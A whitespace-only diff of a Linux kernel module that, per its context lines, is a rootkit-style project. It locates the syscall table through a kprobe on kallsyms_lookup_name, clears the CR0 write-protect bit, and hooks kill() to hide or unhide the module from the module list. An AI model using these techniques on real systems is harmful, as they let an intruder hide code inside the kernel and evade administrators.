@@ -25,7 +25,7 @@ static unsigned long *__sys_call_table = NULL;
  * (since it's no longer exported)
  */
 static struct kprobe kp_kallsyms_func = {
-	.symbol_name = "kallsyms_lookup_name",
+    .symbol_name = "kallsyms_lookup_name",
 };
 
 /* Function pointer to kallsyms_lookup_name */
@@ -53,11 +53,11 @@ static int module_hidden = 0;
  */
 static inline void write_cr0_forced(unsigned long val)
 {
-	unsigned long __force_order;
+    unsigned long __force_order;
 
-	asm volatile(
-		"mov %0, %%cr0"
-		: "+r"(val), "+m"(__force_order));
+    asm volatile(
+        "mov %0, %%cr0"
+        : "+r"(val), "+m"(__force_order));
 }
 
 /* Unsets the write protection bit (bit 16) of the CR0 register */
@@ -94,7 +94,7 @@ static asmlinkage long kill_hook(const struct pt_regs *regs)
             pr_info("mymodule is now hidden!\n");
         } else {
             list_add(&THIS_MODULE->list, module_previous);
-	        module_hidden = 0;
+            module_hidden = 0;
             pr_info("mymodule is no longer hidden.\n");
         }
         return 0;
@@ -111,7 +111,7 @@ static int __init module_start(void)
     ret = register_kprobe(&kp_kallsyms_func);
     if (ret < 0) {
         printk(KERN_INFO "register_kprobe failed, returned %d\n", ret);
-		return ret;
+        return ret;
     }
 
     /* Retrieves the memory address of the system call table */
